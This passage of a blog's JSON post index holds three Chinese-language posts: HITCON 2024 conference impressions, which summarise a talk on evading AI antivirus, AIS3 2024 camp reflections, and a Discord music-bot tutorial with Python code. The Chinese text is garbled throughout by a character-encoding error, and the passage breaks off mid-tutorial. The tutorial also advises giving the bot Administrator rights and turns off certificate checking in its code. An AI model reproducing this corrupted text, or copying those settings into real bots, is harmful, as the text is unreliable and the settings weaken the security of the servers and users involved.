åœ¨è³‡å®‰çš„é“è·¯ä¸Šä¸å­¤ç¨ï¼Œç•¢ç«Ÿæœƒä¾†HITCONçš„äººæˆ–å¤šæˆ–å°‘éƒ½æ˜¯å°æ–¼è³‡å®‰æœ‰èˆˆè¶£çš„äººï¼Œå»ºè­°å¤§å®¶ä¸è¦å®³ç¾ï¼Œå¯ä»¥å‹‡æ•¢ä¸€é»å»å¤šè·Ÿä¸è«–æ˜¯ç¤¾ç¾¤æ”¤ä½çš„ç¤¾åœ˜ã€è´ŠåŠ©å•†æ”¤ä½ï¼Œåˆæˆ–æ˜¯ä½ æƒ³åœ¨è·¯ä¸Šéš¨æ©Ÿæ­è¨•è·¯äººä¹Ÿä¸æ˜¯ä¸è¡Œ (X\nè³‡å®‰è€æ‰‹ #\rè€Œå°æ–¼å·²ç¶“æœ‰ä¸€å®šç¨‹åº¦çš„äººä¾†è¬›ï¼Œä¹Ÿèƒ½å»å¤šè½ä¸€äº›è¼ƒç‚ºæŠ€è¡“é¢å‘çš„è­°ç¨‹ï¼Œæ›´é‡è¦çš„æ˜¯å¦‚æœå¹³å¸¸æœ‰åœ¨æ‰“CTFçš„è©±ï¼Œå¯ä»¥åœ¨ç¾å ´çœ‹åˆ°ä¸€å †å¹³å¸¸æ¯”è³½æ™‚æœƒé‡åˆ°çš„è³½æ£\nä¹Ÿå¯ä»¥å¤šå»è·Ÿç¤¾ç¾¤æ”¤ä½èŠä¸€èŠï¼Œæˆ–æ˜¯åƒèˆ‡ä»–å€‘çš„æ”¤ä½æ´»å‹•ï¼Œæ”¤ä½çš„æ´»å‹•æ˜¯æ¯”è¼ƒæŠ€è¡“å–å‘çš„ï¼Œä¹Ÿå¯ä»¥å»æ¿€é€²è‡ªå·±çš„èƒ½åŠ›çœ‹çœ‹\nåˆæˆ–æ˜¯è¦è·Ÿä»–å€‘ç›´æ¥é¢è©¦æ‡‰è©²ä¹Ÿä¸æ˜¯ä¸è¡Œ\nHITCON #\ré€™é‚Šå…ˆç°¡å–®ä»‹ç´¹ä¸€ä¸‹HITCONæ˜¯ç”šéº¼ HITCON aka å°ç£é§­å®¢å¹´æœƒ Hacks In Taiwan Conference\nä»Šå¹´(2024)ç‚ºHITCONèˆ‰è¾¦çš„ç¬¬20å‘¨å¹´(å•ªæ©Ÿå•ªæ©Ÿå•ªæ©Ÿ)\nè€ŒHITCONæ´»å‹•å…§å®¹æˆ‘èªç‚ºä¸»è¦å¯ä»¥åˆ†æˆä¸‹åˆ—ä¸‰å€‹éƒ¨åˆ†\nåˆ†åˆ¥æ˜¯ è­°ç¨‹ã€ç¤¾ç¾¤æ”¤ä½ã€è´ŠåŠ©å•†æ”¤ä½\nç¤¾ç¾¤æ”¤ä½ #\rç¤¾ç¾¤æ”¤ä½è£¡é¢ä¸»è¦æ˜¯å„æ ¡ç¤¾åœ˜ã€è³‡å®‰ç›¸é—œç¤¾ç¾¤ç­‰\nåƒæ˜¯å°±æœ‰HITCON GIRLSã€æˆå¤§è³‡å®‰ç¤¾(B33F 50UPæˆ°éšŠ)ã€ä¸­é›»æœƒ\u0026hellip;ã€€ç•¶ç„¶é‚„æœ‰æˆ‘é€™æ¬¡æœ‰å¹«å¿™çš„NISRAæ”¤ä½ é›–ç„¶æˆ‘ä¹Ÿåœ¨B33F 50UPæˆ°éšŠå°±æ˜¯äº†\nå…¶å¯¦æ»¿å»ºè­°å¤§å®¶æ²’äº‹å°±å¯ä»¥å¤šä¾†é€™é‚Šè·Ÿå„å¤§ç¤¾ç¾¤åšäº¤æµï¼Œå¦‚æœä½ é‚„æ˜¯é«˜ä¸­ç”Ÿçš„è©±ï¼Œå¯ä»¥å‰å¾€ä¸­é›»æœƒèˆ‡ä»–å€‘ç¨ä½œäº¤æµï¼Œè€Œå¦‚æœä½ æ˜¯å¤§å­¸ç”Ÿä¹Ÿå¯ä»¥å»åˆ°TSCçš„æ”¤ä½å»åšä¸€äº›äº†è§£ä¹‹é¡çš„\nç•¶ç„¶ä¹Ÿå¾ˆæ­¡è¿å»å…¶ä»–å„å¤§æ”¤ä½å»äº†è§£ä»–å€‘åœ¨å¹¹å˜›ï¼Œæˆ‘è‡ªå·±æ˜¯æ»¿é–‹å¿ƒå¦‚æœæœ‰äººä¾†æˆ‘å€‘æ”¤ä½çš„å•¦ï¼Œç›¸ä¿¡å…¶ä»–æ”¤ä½åŸºæœ¬ä¸Šä¹Ÿéƒ½æ˜¯é€™æ¨£ï¼Œå› æ­¤ä¹Ÿå»ºè­°å¤§å®¶ä¸è¦å®³ç¾ï¼Œç›¡é‡å»å¤šå¤šèˆ‡å¤§å®¶äº¤æµï¼Œè€Œä¸”é‚„å¯ä»¥æ‹¿å¾ˆå¤šæ”¤ä½çš„é…·é…·çå“(X\nè´ŠåŠ©å•†æ”¤ä½ #\ré€™é‚Šä¸»è¦æ˜¯å„å¤§æœ‰è´ŠåŠ©çš„å» å•†èƒ½å¤ ä¾†åˆ°é€™é‚Šæ“ºæ”¤ã€ä»‹ç´¹ä»–å€‘çš„å…¬å¸ï¼Œæ”¤ä½ä¹Ÿæœƒæœ‰ä¸€äº›å°æ´»å‹•ï¼Œåƒæ˜¯DEVCOREçš„å¥—åœˆåœˆä¹‹é¡çš„ã€‚\nä¹Ÿèƒ½å‘å„å¤§æ”¤ä½è©¢å•ä¸€äº›ä»–å€‘å…¬å¸çš„äº‹é …ã€æˆ–æ˜¯ä½ å¥½å¥‡çš„æ±è¥¿ä¹‹é¡çš„\nå…¶å¯¦åŸºæœ¬ä¸Šèˆ‡ç¤¾ç¾¤æ”¤ä½æ»¿åƒçš„ åªæ˜¯è®Šæˆæ˜¯ç”±å…¬å¸æ“ºæ”¤\nè­°ç¨‹ #\ré€™æ¬¡å»è½äº†å¾ˆå¤šå ´è­°ç¨‹ï¼Œè€Œè¨±å¤šè­°ç¨‹éƒ½ä¸æ˜¯ç”¨ä¸­æ–‡åœ¨è¬›ï¼Œä½†å¤§å®¶å¯ä»¥æ”¾å¿ƒï¼Œç¾å ´éƒ½æœ‰é–‹æ”¾åŒæ­¥å£è­¯ï¼Œå› æ­¤ä¹Ÿä¸ç”¨å®³æ€•è‡ªå·±è½ä¸æ‡‚ï¼Œåè€Œé‚„å¯ä»¥å»æ¥è§¸åˆ°å¹³å¸¸å¾ˆé›£æœ‰æ©Ÿæœƒè½åˆ°çš„å¤–æ–‡è­°ç¨‹ï¼Œä¹Ÿé‚„å¯ä»¥å¤šå¤šè¨“ç·´è‡ªå·±çš„å¤–èªè†è½èƒ½åŠ›(X\nä½†é€™é‚Šä¸»è¦ä»‹ç´¹å…©å ´å°è±¡æ¯”è¼ƒæ·±åˆ»çš„è­°ç¨‹ï¼Œåˆ†åˆ¥æ˜¯Evasive attacks against AI-powered antivirus software - Yu Arai ã€ Background of those glitches in Zelda BoTW \u0026amp; ToTK - Yuda\nEvasive attacks against AI-powered antivirus software - Yu Arai #\ré€™å ´è­°ç¨‹ä¸»è¦æ˜¯åœ¨ä»‹ç´¹ï¼Œä»–æ˜¯å¦‚ä½•bypassæ‰ç¾åœ¨å¸‚é¢ä¸Šç¾æœ‰çš„ä½¿ç”¨AIèˆ‡å‚³çµ±æª¢æ¸¬æŠ€è¡“çš„é˜²æ¯’è»Ÿé«”ï¼Œä»¥åŠæœ€å¾Œä¹Ÿå¸¶æˆ‘å€‘å»æ€è€ƒäº†ä¸€ä¸‹ï¼Œæœƒæƒ³ç¹éé˜²æ¯’æ˜¯æœªä¾†ä¸€å®šæœƒé¢å°åˆ°çš„è­°é¡Œï¼Œä¹Ÿå› æ­¤è©²å¦‚ä½•é¿å…ä»–å€‘å»ç¹éé˜²æ¯’ä¹Ÿæ˜¯ä¸€å€‹å¾ˆå¥½ä¹Ÿå¾ˆé‡è¦çš„é‡é»ã€‚\nè€Œå…¶å¯¦å°è±¡æ·±åˆ»çš„é»ä¸»è¦æœ‰å…©é»ï¼Œç¬¬ä¸€é»æ˜¯å› ç‚ºé€™å ´æ˜¯æ—¥æ–‡çš„è­°ç¨‹ï¼Œæœ¬ä¾†ä»¥ç‚ºè‡ªå·±å¯ä»¥ä¸ç”¨é ç¿»è­¯å°±è½æ‡‚ï¼Œ çµæœç™¼ç¾è‡ªå·±è½å¾—æ‡‚çš„æ—¥æ–‡ä¹Ÿå°±åªæœ‰å‹•æ¼«é‚£å¹¾å¥\nè€Œç¬¬äºŒé»å…¶å¯¦æ˜¯å› ç‚ºæˆ‘ä»Šå¹´AIS3å°ˆé¡Œåšçš„éƒ¨åˆ†ä¹Ÿæœ‰é»é¡ä¼¼æ˜¯åœ¨å»éœæ…‹åˆ†ææƒ¡æ„è»Ÿé«”ï¼Œå› æ­¤ç™¼ç¾è‡ªå·±åšçš„é¡ä¼¼çš„æ±è¥¿å±…ç„¶å°±é€™æ¨£è¢«bypassæ‰äº†ï¼Œä¹Ÿæœ‰é»éœ‡é©š\nBackground of those glitches in Zelda BoTW \u0026amp; ToTK - Yuda #\ré€™å ´æ˜¯è«‹åˆ°æœ‰åœ¨youtubeæ‹æ”å½±ç‰‡çš„Yudaä¾†åšè¬›å¸«ï¼Œè€Œæœ¬å ´è­°ç¨‹ä¸»è¦æ˜¯åœ¨ä»‹ç´¹èªªä»–å€‘åœ¨éŠæˆ²ä¸­æ˜¯å¦‚æœå»æŒ–æ˜ã€ç™¼ç¾ä¸€äº›ç¨ç‰¹çš„æ¼æ´(GLITCH)ï¼Œä»¥åŠä¸€äº›ç›¸é—œç¶“é©—åˆ†äº«ç­‰\næˆ‘èªç‚ºé€™æ˜¯ä¸€å ´å¾ˆç‰¹åˆ¥å¾ˆé…·çš„è­°ç¨‹ï¼Œä»–ä¸¦éåƒæ˜¯å‚³çµ±å¸¸è¦‹çš„è­°ç¨‹ï¼Œä»–åè€Œæ²’æœ‰ç‰¹åˆ¥ä»‹ç´¹è¨±å¤šæŠ€è¡“ç›¸é—œçš„å…§å®¹ï¼Œä½†æ˜¯æˆ‘è¦ºå¾—å…¶ä¸­æŒ–æ˜æ¼æ´æ‰€éœ€è¦çš„æ€è€ƒåŠå‰µæ–°çµåˆï¼Œæ˜¯è³‡å®‰äººæœƒæ»¿éœ€è¦å…·å‚™çš„èƒ½åŠ›ï¼Œå°±æ˜¯èƒ½è·³è„«å‚³çµ±æ€è€ƒçš„æ¨£å­ï¼Œç¸½ä¹‹æ˜¯å ´å¾ˆæ£’çš„è­°ç¨‹\n","date":"27 August 2024","externalUrl":null,"permalink":"/posts/004_2024hitcon/","section":"Posts","summary":"2024 HITCONå¿ƒå¾—","title":"2024 HITCONå¿ƒå¾—","type":"posts"},{"content":"\rAIS3 a.k.a. å¤§å‹ç¶²å‹è¦‹é¢æœƒ\nå¥½å¥½ç© æ˜å¹´é‚„å»\rå‰è¨€ #\ré€™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åƒåŠ AIS3 çµæœå°±ä¸å°å¿ƒè¢«æˆ‘è¹­åˆ°æœ€ä½³å°ˆé¡Œçäº†\nåœ¨é€™é‚Šå†æ¬¡æ„Ÿè¬å°è”¡ã€èŠå§†è·Ÿl3oboä¸‰ä½éšŠå‹çš„å‡±ç‘\nå°ˆé¡Œ #\rä¸»é¡Œç™¼æƒ³ #\ræˆ‘é€™æ¬¡æ˜¯é¸åˆ°æƒ…è³‡é‹ç”¨åŠé˜²è­·ï¼Œçµ„åˆ¥ç‚ºB8\nç•¶åˆå®Œå…¨å°±æ˜¯è¢«é€™å€‹çœ‹èµ·ä¾†å¾ˆé…·çš„åå­é¨™é€²ä¾†çš„ï¼Œå®Œå…¨ä¸çŸ¥é“é€™å€‹åœ¨å¹¹å˜› é€™ä¹Ÿå°±å°è‡´æˆ‘å€‘å°ˆé¡Œä¸»é¡Œæƒ³åˆ°äº†ç¬¬äºŒå¤©æ‰å‹‰å¼·å®šæ¡ˆï¼Œç„¶å¾Œé€™é‚Šè¦å†è·Ÿæˆ‘çš„çµ„å“¡é“æ­‰ä¸€æ¬¡\nå› ç‚ºå…¶å¯¦æˆ‘ä¸€ç›´æƒ³åšæœ‰é—œæƒ¡æ„è»Ÿé«”çš„è£½ä½œè·Ÿåˆ†æä¹‹é¡çš„ï¼Œæ‰€ä»¥æˆ‘ç®—æ˜¯æœ‰é»å …æŒ(?)çš„ä¸€ç›´ä¸æ”¾æ£„é€™å€‹ä¸»é¡Œï¼Œçµæœæœ€å¾Œä¹ŸçœŸçš„è¢«æˆ‘ç›§æˆåŠŸäº†\næœ€å¾Œçš„ä¸»é¡Œå°±æ˜¯åŸºæ–¼èšé¡åˆ†ææŠ€è¡“çš„æƒ¡æ„ç¨‹å¼è®Šé«”è¾¨è­˜æ–¹æ³•ç ”ç©¶\næ„Ÿè¬å‹èˆ¢åŠ©æ•™å”åŠ©ä¸»é¡Œç™¼æƒ³ğŸ›\nè£½ä½œéç¨‹ #\ræˆ‘è² è²¬çš„éƒ¨åˆ†ç®—æ˜¯é€²è¡Œè³‡æ–™çš„å‰è™•ç†ä»¥åŠè³‡æ–™çš„å¾ŒçºŒæ¶ˆåŒ–åˆ†æ\næ‰€ä»¥å¾Œé¢ä»–å€‘åœ¨åšåˆ†æçš„æ™‚å€™æˆ‘çš„å·¥ä½œå…§å®¹å°±è®Šæˆäº†å•æœ‰æ²’æœ‰äººè¦åƒèµ·å¸\nå ±å‘Š #\ræˆ‘å€‘å¤§æ¦‚æ˜¯æœ€å¾Œä¸€å¤©ä¸‹åˆæ‰é–‹å§‹æ…¢æ…¢åšç°¡å ±çš„ï¼Œæˆ‘åªèƒ½è·Ÿå¤§å®¶èªª\nå®Œ å…¨ åš ä¸ å®Œ\nå› ç‚ºå…¶å¯¦æˆ‘å°åšç°¡å ±ä¹Ÿæ²’æœ‰åˆ°å¾ˆç†Ÿï¼ŒåŠ ä¸Šå°ä¸»é¡Œä¹Ÿæœ‰é»è¿·èŒ«ï¼Œå› æ­¤å…¶å¯¦æ”¹äº†å¾ˆå¤šæ¬¡\nç„¶å¾Œé‡è¦çš„ä¸€ä»¶äº‹ä¸€å®šè¦è©¦å ±ï¼Œè€Œä¸”æˆ‘æ˜¯è¦ºå¾—éœ€è¦ä¸åªä¸€æ¬¡\nå…¶å¯¦æˆ‘åœ¨çœŸçš„è©¦å ±ä»¥å¾Œæ‰ç™¼ç¾è‡ªå·±åœ¨æ™‚é–“çš„æŒæ¡ã€èªªè©±çš„çµæ§‹ä¸Šéƒ½é‚„æœ‰å¾ˆå¤šå¾ˆå¤šçš„å•é¡Œï¼Œæ‰€ä»¥å¾Œé¢å°±æ˜¯é–‹å§‹ç˜‹ç‹‚å¯©ç¨¿åŠ ä¸€ç›´ç·´ç¿’å ±è‡ªå·±çš„éƒ¨åˆ†\né‚£å€‹æ™‚å€™çªç„¶åœ¨æƒ³ï¼Œæˆ‘æ€éº¼æŠŠå ±å‘Šå ±åˆ°è·Ÿåœ¨è·‘speedrunä¸€æ¨£ ä¸€ç›´åœ¨ç˜‹ç‹‚å£“æ™‚é–“ é€™é‚Šä¹Ÿè¬è¬ä¸‰è§’è›‡è·Ÿpwn2ooownå…©ä½åŠ©æ•™æœ‰è½æˆ‘å€‘è©¦å ±\nä½†çµæœæœ€å¾Œå ±å‘Šæ™‚é–“é‚„æ˜¯æ²’æå¥½ï¼Œå¤§æ¦‚å¤šè¬›äº†40ç§’ä»¥ä¸Š;(\næˆ‘çµ¦è‡ªå·±å ±å‘Šçš„åˆ†æ•¸å¤§æ¦‚åªæœ‰6/10\nç¸½çµ #\ræˆ‘è¦ºå¾—AIS3å…¶å¯¦æ»¿é©åˆåƒæˆ‘é€™ç¨®ï¼Œå‰›æ¥è§¸æœ‰é»æ¦‚å¿µäº†ï¼Œä½†é‚„æ˜¯ä¸å¤ªç¢ºå®šæœªä¾†å…·é«”æ–¹å‘çš„äºº\nåƒæˆ‘é€™ç¨®äººä¾†äº†AIS3å°±æ˜¯å…©å€‹çµæœï¼Œä¸€æ˜¯ç¢ºèªè‡ªå·±æœªä¾†æ–¹å‘ï¼›äºŒæ˜¯æ”¾æ£„è³‡å®‰\næœ¬ä¾†æ˜¯å·®é»è®ŠæˆäºŒäº† ä½†æœ€ä½³å°ˆé¡Œçè®“æˆ‘æ±ºå®šåšè³‡å®‰é€™å¡Šåšåˆ°æ­»äº†\nç„¶å¾ŒçœŸçš„å»ºè­°å¤§å®¶è¦ä½å®¿ï¼Œæ™šä¸Šè·Ÿçµ„å“¡è¨è«–å°ˆé¡Œä¹Ÿæ˜¯ç²¾è¯ä¹‹ä¸€ï¼Œæˆ‘å°±æœ‰çœ‹åˆ°ä¸€çµ„ä»–å€‘æœ‰çµ„å“¡æ²’ä½å®¿ æˆ‘æ ¹æœ¬æ²’çœ‹éä»–å€‘ç¬¬å››å€‹çµ„å“¡\nåˆå· #\rAIS3åˆ°åº•å·ä¸å·ï¼Œä¾†é€™è£¡åˆ°åº•æœƒä¸æœƒçˆ†è‚ï¼Ÿ å·ï¼Œå·æ­»äº†ã€‚æ‹œè¨—å¤§å®¶ä¸è¦å†å·äº†\u0026hellip;\nç´¯æ­» #\rå…¶å¯¦æˆ‘è¦ºå¾—ä¾†AIS3æœƒä¸æœƒçˆ†è‚æ˜¯è¦çœ‹å€‹äººæ¬¸\nçœ‹ä½ è¿½æ±‚ä»€éº¼å§ï¼Œå¦‚æœç›®æ¨™æ˜¯æœ€ä½³å°ˆé¡Œçš„è©±ç•¶ç„¶æ˜¯æœƒå¾ˆç´¯\nä½†å¦‚æœä½ åªæ˜¯æƒ³è¦ä¾†å­¸ç¿’çŸ¥è­˜è·Ÿæ‰¾åˆ°æ–¹å‘çš„è©±å…¶å¯¦æ˜¯å¯ä»¥ä¸ç”¨é‚£éº¼ç´¯çš„ï¼Œä½†ç•¶ç„¶è¦è·Ÿè‡ªå·±å°ˆé¡Œçš„çµ„å“¡å¥½å¥½å”èª¿ã€æºé€šå¥½\nä¸ééƒ½ä¾†äº†é‚£ç›®æ¨™ç•¶ç„¶æ˜¯è¦æ”¾åœ¨æœ€ä½³å°ˆé¡Œä¸Šå§\nå»¢è©±æ™‚é–“ #\ræœ¬ä¾†å‰›å ±å‘Šå®Œæ˜¯æ»¿çµ•æœ›çš„ æˆ‘è¦ºå¾—è‡ªå·±è¬›å¾—å¾ˆçˆ› è€Œä¸”æ™‚é–“ä¹Ÿæ²’æŠ“å¥½ æ‰€ä»¥çµ•æœ›ä¹‹ä¸‹å°±æœ‰äº†ä¸‹é¢é€™å¼µ\nçµæœæœ€å¾Œé‚„çœŸçš„æ‹¿åˆ°äº†\nå¯«å…±ç­†çœŸçš„å¾ˆå¥½ç©ï¼Œé›–ç„¶æ„Ÿè¦ºå¤§å®¶éƒ½åªæ˜¯æŠŠè¬›å¸«çš„å ±å‘Šæ‰“ä¸Šå»è€Œå·²\nåœ¨ä¸‹é¢è¨»é‡‹çš„åœ°æ–¹èŠå¤©çœŸçš„å¾ˆå¥½ç©\n","date":"6 August 2024","externalUrl":null,"permalink":"/posts/003_2024ais3/","section":"Posts","summary":"AIS3 è®š  æˆ‘æ˜¯å¥½é§­å®¢","title":"2024 AIS3å¿ƒå¾—","type":"posts"},{"content":"","date":"6 August 2024","externalUrl":null,"permalink":"/tags/code/","section":"Tags","summary":"","title":"Code","type":"tags"},{"content":"\rå› ç‚ºæœ€è¿‘dcå¾ˆå¤šéŸ³æ¨‚æ©Ÿå™¨äººéƒ½å£æ‰\nä¸€æ°£ä¹‹ä¸‹å°±ç›´æ¥é€échatGPTå¯«ä¸€å€‹å‡ºä¾†äº†\rå‰è¨€ #\rå…¶å¯¦çœŸçš„æ²’å•¥æŠ€è¡“å«é‡ï¼Œå› ç‚ºä»£ç¢¼çœŸçš„éƒ½æ˜¯å«GPTå¹«æˆ‘æ“å‡ºä¾†çš„\nä½†é‚„æ˜¯æƒ³èªªä¸Ÿä¸Šä¾†å¥½äº†ï¼Œç•¢ç«Ÿåœ¨è‡ªå·±æœ¬åœ°æ¶æ©Ÿå™¨äººå°±ä¸ç”¨çœ‹å…¶ä»–äººçš„è‡‰è‰²äº† (X åŸºæœ¬ä¸Šæœƒå¾é ­é–‹å§‹è¬›å¦‚ä½•å»ºç«‹ï¼Œä½†æœ‰äº›æˆ‘æ²’ç¢°åˆ°çš„åŠŸèƒ½å°±ä¸æœƒç‰¹åˆ¥ä»‹ç´¹\nå› ç‚ºæˆ‘è‡ªå·±ä¹Ÿä¸æ‡‚\næƒ³æŠ„ä»£ç¢¼çš„å¯ä»¥ç›´æ¥è·³åˆ°é‚£é‚Šå°±å¥½äº†\nä½†é‚„æ˜¯æ”¾ä¸€ä¸‹è·ŸGPTæºé€šçš„æµç¨‹ä¹‹é¡çš„ æ°´ä¸€ä¸‹å…§å®¹\nå»ºç«‹DCæ©Ÿå™¨äºº #\ré¦–å…ˆå…ˆåˆ°\rDiscord Developer Portal å»ºç«‹ä¸€å€‹æ©Ÿå™¨äººå‡ºä¾†\nç™»å…¥å¾Œå·¦ä¸Šè§’New Applicationé»ä¸‹å»ï¼Œå†å–å€‹åå­ï¼Œå°ˆå±¬ä½ ã„‰æ©Ÿå™¨äººå°±èª•ç”Ÿäº†\nNew Application\rå‰›é€²å»å°±å¯ä»¥å…ˆçœ‹åˆ°è¨­å®šçš„ä»‹é¢ï¼Œé€™é‚ŠåŸºæœ¬ä¸Šå°±æ˜¯å¯ä»¥è¨­å®šæ©Ÿå™¨äººçš„åç¨±ã€é ­è²¼ã€é‚„æœ‰é»é€²æ©Ÿå™¨äººæœƒçœ‹åˆ°çš„æè¿°\nç„¶å¾ŒDESCRIPTIONçš„éƒ¨åˆ†æœƒåœ¨ é—œæ–¼æˆ‘ çš„éƒ¨åˆ†é¡¯ç¤º å–å¾—token #\ræ¥è‘—åˆ°æ—é‚Šé¸å–®é¸æ“‡Bot\nåœ¨é€™é‚Šå¯ä»¥é¡å¤–è¨­å®šæ©Ÿå™¨äººçš„æ©«å¹…(BANNER)\nè€Œæˆ‘å€‘é€™é‚Šä¸»è¦è¦å–å¾—æ©Ÿå™¨äººçš„TOKEN\né»ä¸‹å»Reset Tokenç¢ºèªå¾Œå–å¾—å…¨æ–°çš„tokenå…ˆè‡ªå·±è¨˜èµ·ä¾†\nåˆ‡è¨˜ä¸è¦å¤–æ´© å› ç‚ºæœ‰tokenå°±èƒ½å¤ åŸ·è¡Œä½ çš„æ©Ÿå™¨äººäº†\nReset Token\ræ¥è‘—æ»‘åˆ°ä¸‹é¢Privileged Gateway Intentsçš„éƒ¨åˆ†ï¼Œæ¥è‘—æŠŠä¸‰å€‹é¸é …éƒ½æ‰“å‹¾\né€™é‚Šä¸»è¦æ˜¯è¦è®“æ©Ÿå™¨äººèƒ½å¤ æ¥æ”¶æŒ‡ä»¤èˆ‡ç”¨æˆ¶äº’å‹•\né‚€é€²ä¼ºæœå™¨ #\ré€²å…¥OAuth2çš„éƒ¨åˆ†ï¼Œæ»‘åˆ°æœ€ä¸‹é¢çš„OAuth2 URL Generator\nä¸»è¦å‹¾é¸botå°±å¥½\nè€Œä¸‹é¢çš„BOT PERMISSIONSå‰‡æ˜¯å‹¾é¸Administrator\nç›´æ¥æ‹¿æ‰€æœ‰æ¬Šé™å°±ä¸ç”¨å†æ…¢æ…¢è¨­å®šäº†\nbot\rAdministrator\rå†ä¾†å¾€ä¸‹çœ‹å°±å¯ä»¥åœ¨ GENERATED URL çœ‹åˆ°ä½ æ©Ÿå™¨äººçš„é‚€è«‹é€£æ¥äº†\nåŸºæœ¬ä¸Šæ©Ÿå™¨äººçš„éƒ¨åˆ†å°±åˆ°é€™é‚Šäº† å†ä¾†å°±æ˜¯è¦å¯«codeçš„éƒ¨åˆ†äº†\nä»£ç¢¼ #\rå®‰è£æ‰€éœ€çš„åº« #\ræ‰“é–‹ä½ çš„cmd ä¸€èµ·å¿«æ¨‚å®‰è£\npip install discord.py youtube_dl pip install yt-dlp ffmpegå®‰è£ #\rå‰å¾€\rBtbN FFmpeg Releasesä¸‹è¼‰ ffmpeg-master-latest-win64-gpl.zip\nè§£å£“ç¸®å¾Œä¸Ÿåˆ°ä¸€å€‹ä¸å¤ªæœƒå‹•åˆ°çš„åœ°æ–¹\næ¥è‘—æ‰“é–‹ç’°å¢ƒè®Šæ•¸ï¼Œwin11æ‰“é–‹ç’°å¢ƒè®Šæ•¸çš„æ–¹æ³•å¦‚ä¸‹\nè¨­å®š ç³»çµ± ç³»çµ±è³‡è¨Š é€²éšç³»çµ±è¨­å®š å†ä¾†å°±èƒ½çœ‹åˆ°ç’°å¢ƒè®Šæ•¸äº†\næ¥è‘—é¸æ“‡Pathç„¶å¾Œç·¨è¼¯ï¼Œæ–°å¢ä½ å‰›å‰›è§£å£“ç¸®ä¸‹ä¾†çš„æª”æ¡ˆä¸­binè³‡æ–™å¤¾çš„ä½ç½® (C:\\ffmpeg\\bin) é€™æ¨£å°±é †åˆ©å®‰è£å®Œæˆäº†ï¼Œå¯ä»¥æª¢æŸ¥çœ‹çœ‹æœ‰æ²’æœ‰é †åˆ©å®‰è£ï¼Œæ²’æœ‰çš„è©±å°±é‡é–‹æ©Ÿçœ‹çœ‹\nffmpeg -version bot.py #\rä¸»è¦å¯ä»¥åˆ†å…©ç¨®æ’¥æ”¾æ–¹å¼\n1.ç·šä¸Šä¸²æµ(è¼ƒä¸ç©©å®š)\n2.ä¸‹è¼‰åˆ°æœ¬æ©Ÿ(å¾ˆç©©å®š)\nç·šä¸Šä¸²æµ #\rå…ˆè¬›ç¬¬ä¸€ç¨®ç·šä¸Šä¸²æµçš„éƒ¨åˆ†\nç©©å®šæ€§çš„éƒ¨åˆ†å°±çœŸçš„å¾ˆçˆ› å¤§æ¦‚æ¯é¦–æ­Œéƒ½æ’¥ä¸å®Œ å¤§æ¦‚æ’¥å€‹ä¸€å…©åˆ†é˜å·¦å³è€Œå·²\nimport discord from discord.ext import commands import yt_dlp as youtube_dl import asyncio intents = discord.Intents.default() intents.message_content = True intents.voice_states = True bot = commands.Bot(command_prefix=\u0026#39;\u0026amp;\u0026#39;, intents=intents) ytdl_format_options = { \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, \u0026#39;outtmpl\u0026#39;: \u0026#39;%(extractor)s-%(id)s-%(title)s.%(ext)s\u0026#39;, \u0026#39;restrictfilenames\u0026#39;: True, \u0026#39;noplaylist\u0026#39;: True, \u0026#39;nocheckcertificate\u0026#39;: True, \u0026#39;ignoreerrors\u0026#39;: False, \u0026#39;logtostderr\u0026#39;: False, \u0026#39;quiet\u0026#39;: True, \u0026#39;no_warnings\u0026#39;: True, \u0026#39;default_search\u0026#39;: \u0026#39;auto\u0026#39;, \u0026#39;source_address\u0026#39;: \u0026#39;0.0.0.0\u0026#39; } ffmpeg_options = { \u0026#39;options\u0026#39;: \u0026#39;-vn\u0026#39; } ytdl = youtube_dl.YoutubeDL(ytdl_format_options) class YTDLSource(discord.PCMVolumeTransformer): def __init__(self, source, *, data, volume=0.5): super().__init__(source, volume) self.data = data self.title = data.get(\u0026#39;title\u0026#39;) self.url = data.get(\u0026#39;url\u0026#39;) @classmethod async def from_url(cls, url, *, loop=None, stream=False): loop = loop or asyncio.get_event_loop() data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream)) if \u0026#39;entries\u0026#39; in data: data = data[\u0026#39;entries\u0026#39;][0] filename = data[\u0026#39;url\u0026#39;] if stream else ytdl.prepare_filename(data) return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data) queue = asyncio.Queue() queue_urls = [] current_player = None # ç”¨æ–¼å„²å­˜ç•¶å‰æ’­æ”¾çš„éŸ³æ¨‚ @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) @bot.command() async def p(ctx, url): if not ctx.message.author.voice: await ctx.send(f\u0026#34;{ctx.message.author.name} is not connected to a voice channel\u0026#34;) return channel = ctx.message.author.voice.channel if ctx.voice_client is None: voice_client = await channel.connect() else: voice_client = ctx.voice_client # Queue the song await queue.put(url) queue_urls.append(url) if not voice_client.is_playing(): await play_next_song(ctx, voice_client) @bot.command() async def leave(ctx): if ctx.voice_client: await ctx.guild.voice_client.disconnect() @bot.command() async def q(ctx): if queue_urls: queue_list = \u0026#34;\\n\u0026#34;.join([f\u0026#34;{i+1}. {url}\u0026#34; for i, url in enumerate(queue_urls)]) await ctx.send(f\u0026#34;Current queue:\\n{queue_list}\u0026#34;) else: await ctx.send(\u0026#34;The queue is currently empty.\u0026#34;) @bot.command() async def s(ctx): if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.stop() await ctx.send(\u0026#39;Skipped the current song.\u0026#39;) # Optionally, automatically play the next song if not queue.empty(): await play_next_song(ctx, ctx.voice_client) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) async def play_next_song(ctx, voice_client): global current_player if not queue.empty(): url = await queue.get() queue_urls.pop(0) async with ctx.typing(): try: player = await YTDLSource.from_url(url, loop=bot.loop, stream=True) current_player = player voice_client.play(player, after=lambda e: asyncio.run_coroutine_threadsafe(play_next_song(ctx, voice_client), bot.loop)) await ctx.send(f\u0026#39;æ­£åœ¨æ’¥æ”¾: {player.title}\u0026#39;) except Exception as e: await ctx.send(\u0026#39;error:\u0026#39;) print(e) else: await ctx.send(\u0026#39;no song\u0026#39;) bot.run(\u0026#39;ä½ çš„token\u0026#39;) åæ­£å°±åˆå¡åˆå®¹æ˜“æ–·æ‰ ä¸å¦‚ä¹–ä¹–ä¸‹è¼‰ä¸‹ä¾†\nä¸‹è¼‰åˆ°æœ¬åœ° #\rå› ç‚ºæ˜¯ç¾åœ¨é‚„æœ‰åœ¨ç”¨ã„‰ï¼Œæ‰€ä»¥åŠ 